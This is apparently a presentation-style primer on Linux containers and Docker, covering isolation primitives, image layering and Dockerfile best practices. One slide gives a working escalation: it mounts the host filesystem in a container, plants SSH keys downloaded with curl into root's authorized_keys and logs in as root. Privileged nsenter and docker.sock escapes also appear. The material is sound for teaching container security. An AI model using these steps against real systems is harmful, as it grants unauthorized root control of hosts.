# Containers

A primer on containers, Docker, (and a bit on virtualization)

# Meta

- About ~40 minutes
- 50% first principles: how containers work under the hood
- 50% pragmatic: how to write really basic containers
- 90% in the terminal... sorry!

# Trusted Computing Base (TCB)

- Definition: hardware, firmware, and software components that are critical to
  security; the foundation that your software runs on
- In a cloud-native environment, containers are a critical part of that stack
- If you know how it's built, you know how it breaks or can be compromised
- A rough and simplified example stack:
  - Hardware, _e.g. AWS rack server_
  - **Hypervisor ‚Üí virtual machine, _e.g. EC2_**
  - **Container orchestrator ‚Üí container, _e.g. ECS, EKS_**
  - Operating system, _e.g. Debian_
  - Language runtime, _e.g. V8, Node.js_
  - Application runtime, _e.g. your code_

# Virtualization vs. containerization

The fundamental difference is that a virtual machine runs an entire copy of an
operating system including its kernel, whereas a container shares the host
machine's kernel. [0]

üí° Key trade-off: isolation vs. overhead

Ref[0]: [Container Security][liz] (Rice 2020)

---
# But why?

Key benefits of containers:
- Package all dependencies an application needs:
  - Operating system, e.g. `/tmp`, `libc`
  - External programs, e.g. `wkhtmltopdf`
  - Run-time dependencies, e.g. CA certificates
  - Applications and all their dependencies, app + `node_modules/`
- Immutable artifacts (images)
- Fast startup time, low overhead

üí° Key limitations:
- Weaker isolation mechanism
- Much larger surface area... ~100x more code in kernel vs. hypervisor
- ...but if you used managed services, it's usually _their_ problem

---
# Where are containers running on your laptop?

Try it! _(We'll explain these commands later.)_
```bash
docker run -d --rm nginx:latest
docker ps
ps aux | grep nginx
uname -a
docker exec $ID uname -a
```

In Linux: shared kernel

In macOS: inside an `xhyve` virtual machine
```bash
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
ps aux | grep nginx
uname -a
```

üí° **Containers are just processes!** Also, more on "privileged = danger" later.

---
# Container primitives

Primary:
- `cgroup` (control groups): CPU, RAM, network I/O isolation
- `pivot_root` (change root): filesystem hierarchy isolation
- `unshare` (namespaces): process, user/group, network interface isolation

Secondary:
- `seccomp` (secure computing): system call isolation
- `setcap` (capabilities): Linux capability permissions
- `mount` (overlayfs): overlay filesystems

Ref: [How Containers Work][julia] (Evans 2020)

---
# Control groups

Used to set resource limits and slice out shares of CPU, RAM, network I/O, etc.

```bash
sh                       # Run a subshell in one terminal
ls                       # Run a command ·ïï( ·êõ )·ïó
```

```bash
cd /sys/fs/cgroup        # Show cgroup filesystem in another terminal
mkdir demo && cd demo    # Create a cgroup
echo 100000 > memory.max # Set the maximum memory in the cgroup
pidof sh > cgroup.procs  # Assign the subshell process to the cgroup
```

```bash
ls                       # Run again in original terminal (√ó_√ó)
```

```bash
dmesg                    # Check the kernel ring buffer
```

üí° This is fundamentally what happens when your process "OOMs" in the cloud!

---
# Pivot root

Changes the root directory visible to a child process. Setup: grab [minirootfs](https://alpinelinux.org/downloads/).

```bash
cd /dev/shm/alpine          # Navigate to a temporary directory
curl -o alpine.tar.gz $URL  # Download Alpine mini root filesystem
tar xzvf alpine.tar.gz      # Extract
chroot $PWD sh              # Change the root
ps aux                      # List processes from /proc
touch foo bar baz           # Write a bunch of files
```

_Disclaimer: `pivot_root` is more secure... you can break out of `chroot`!_

---
# Namespaces

Isolate process into different scopes, like `cgroup`, `pid`, `mnt`, `net`.

```bash
ifconfig                    # Check network interfaces
curl httpstat.us/418        # Become a teapot  ï·µî ·¥• ·µî î

unshare --net --uts /bin/sh # Go into a separate network and hostname namespace
hostname teapot-is-life     # Change the hostname
exec bash                   # Reset PS1 prompt
ifconfig                    # New/no network interfaces
curl httpstat.us/418        # No teapot today  ï‚Ä¢`·¥•¬¥‚Ä¢ î
^D                          # Exit the namespace

# Check original namespace
ifconfig
curl httpstat.us/418
hostname
```

---
# A primordial (read: insecure) container

Three primitives so far: control group, file system, and namespace isolation.
Let's make a container!

```bash
unshare --pid --fork chroot alpine sh
ps aux
cat /etc/passwd
```

---
# Secure computing

Limit system calls using `seccomp-bpf`. (Should be enabled, see `docker info`.)

```bash
# Grab a sample seccomp profile
wget https://raw.githubusercontent.com/docker/labs/master/\
security/seccomp/seccomp-profiles/default-no-chmod.json

# Launch a container with the new profile
docker run -it --rm --security-opt seccomp=default-no-chmod.json ubuntu

# Try to interact with files...
touch /bin/lol        # Create a new file
chmod +x /bin/lol     # (Try to) make it executable
ls -la /              # List root
```

üí° This is underutilized in most container deployments!

---
# Linux capabilities

The Linux kernel enforces _many_ more permissions than just file system.

```
capsh --print                           # Get current capabilities state
docker run -it --rm ubuntu:latest       # Launch a Docker container
capsh --print                           # Get capabilities inside container
^D                                      # Exit

docker run -it --rm --privileged ubuntu # Run a *privileged* container
capsh --print                           # D-d-d-anger zone!
```

üí° `CAP_SYS_ADMIN` and `CAP_NET_ADMIN` are the most powerful.
üí° This is underutilized in most container deployments!

---
# Overlays

Concept: build images in _layers_. Upper layers "overlay" lower layers.

```docker
FROM node:16-buster-slim
RUN apt-get install imagemagick
COPY ./app/package.json /app/
RUN cd /app && npm install
COPY ./app /app/
```

Quick example using `mount`:
```
mount -t overlay overlay -o lowerdir=/lo,upperdir=/hi,workdir=/wrk /merged
```

Try this with the alpine mini rootfs!

# Docker "Hello, world!"

```golang
// hello.go
package main
import "github.com/rs/zerolog/log"
func main() {
    log.Print("hello world")
}
```

```docker
# Dockerfile
FROM scratch                    # Use an empty image
COPY hello /                    # Copy the hello binary
CMD ["/hello"]                  # Run the hello binary on boot
```

```bash
go mod init hello               # Initialize Go project
CGO_ENABLED=0 go build          # Compile
docker build -t app .           # Build
docker run -it --rm app         # Run
```

What happens when you change it to `CMD "/hello"`?

---
# Inspecting the image

```bash
docker images                          # List images
docker history app:latest              # Check history

docker save app:latest -o layers.tar   # Save layers
tar xvf layers.tar -C layers           # Extract manifest

# Roughly (unordered) recombine layers
find layers -name layer.tar | xargs -I {} tar xvf {} -C app
```

Things to check out: `manifest.json`, configuration, with a different base.

Try [dive](https://github.com/wagoodman/dive/)!

<!--
On arm64 you can run this with Docker itself. I wouldn't run this outside of a
VM, as it binds to the Docker sock and you it can basically break out and take
over the system as root. Buyer beware!
```
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock jauderho/dive:latest
```

# Build repeatability

Let's compile when building the container!
```docker
ARG GOLANG_VERSION=1.19             # Use build arguments to specify version
FROM golang:${GOLANG_VERSION}       # Base off of official Golang image
WORKDIR /src                        # Change the working directory
COPY go.mod go.sum ./               # Copy dependency manifests
RUN go mod download                 # Download dependencies first
COPY hello.go ./                    # Copy source code
RUN go build -o /hello              # Compile!
CMD ["/hello"]                      # Run the hello binary on boot
```

üí° Understand and leverage layer caching for image size and performance

What does it look like when we `dive` into the image? (Spoiler: it's huge!)

Let's do better...

---
# Multi-stage builds

üí° Idea: separate build-time from run-time!
```docker
ARG GOLANG_VERSION=1.19
FROM golang:${GOLANG_VERSION} as builder # Start a build container stage
COPY go.mod go.sum ./
RUN go mod download
COPY hello.go ./
RUN CGO_ENABLED=0 go build hello.go      # Compile with static dependencies

FROM scratch                             # Start a run-time stage
COPY --from=builder /hello /             # Bring in the built binary
CMD ["/hello"]
```

Ref: https://docs.docker.com/build/building/multi-stage/

---
# Dockerfile best practices

- Use a secure or "golden" base image
- Use multi-stage builds
- Non-root `USER`
- Don't mount sensitive directories
- Don't include sensitive data in the image artifact (even `ARG`)
- Avoid `setuid` binaries
- Include _minimally_ everything that your container needs

Ref: [Container Security][liz] (Rice 2020)

---
# Example: root + host volume mount path

How do you escalate to root? üòà
```
docker run -it --rm -v /:/host ubuntu  # Mount a sensitive directory
id                                     # You're root... in the container
cd /host/root                          # Enter the *host's* filesystem

# Add your keys to the root login
curl https://github.com/allanbreyes.keys > ./.ssh/authorized_keys
```

Remotely enter hsot as root:
```
ssh root@1.2.3.4
```

---
# Let's tear down a Dockerfile...

---
# Docker Compose

Tooling that helps you orchestrate multiple containers.

```bash
docker-compose up             # Start all the services
docker-compose down           # Spin them down
docker-compose exec [service] # Shell into or execute
docker-compose logs [service] # Read/tail logs
docker-compose run            # Run one service (and dependents)
```

---
# Some useful Docker commands/idioms

```bash
docker stop $(docker ps -aq)  # Stop all running containers
docker rm $(docker ps -aq)    # Remove all containers
docker rmi [image]            # Remove some image
docker system prune           # Remove unused stuff
docker diff [container]       # See overlayfs changes
```

---
# Takeaways

- Containers are just processes with some isolation mechanisms
- Straying from the paved path = here be dragons! üíÄ
- Multi-stage Docker builds are a darn great idea
- Understand and leverage layer caching for image size and quick builds
